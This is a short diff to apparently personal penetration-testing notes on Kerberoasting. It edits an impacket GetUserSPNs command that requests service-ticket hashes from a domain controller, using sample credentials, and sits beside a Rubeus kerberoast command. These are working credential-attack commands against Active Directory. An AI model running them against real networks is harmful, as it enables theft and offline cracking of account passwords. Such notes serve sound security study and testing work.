@@ -35,7 +35,7 @@ Rubeus.exe kerberoast /format:hashcat /simple
 ```bash
 impacket-GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC IP> -request 
 
-impacket-GetUserSPNs.py medin.local/tm:Password1 -dc-ip 172.16.105.100 -request -outputfile krb.hash
+impacket-GetUserSPNs.py 'medin.local/tm:Password1$' -dc-ip 172.16.105.100 -request -outputfile krb.hash
 ```
 ### Persistence
 (Rubeus) Obtained ticket information
